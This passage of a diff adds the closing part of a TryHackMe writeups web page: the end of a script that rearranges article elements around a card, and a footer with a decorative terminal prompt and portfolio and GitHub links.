+        .forEach(n => { if (n.parentNode === article) article.removeChild(n); });
+
+      // Refresh snapshot after DOM mutation
+      children = Array.from(article.children);
+      // Find where the card landed and continue from there
+      i = children.indexOf(card) + 1;
+    } else {
+      i++;
+    }
+  }
+})();
+</script>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <span class="footer-text"><span class="prompt">george@kali:~$</span> echo "George Nădejde · TryHackMe Writeups"</span>
+    <div class="footer-links">
+      <a href="https://georgenadejde.github.io" target="_blank" rel="noopener noreferrer">Portfolio</a>
+      <a href="https://github.com/georgenadejde" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
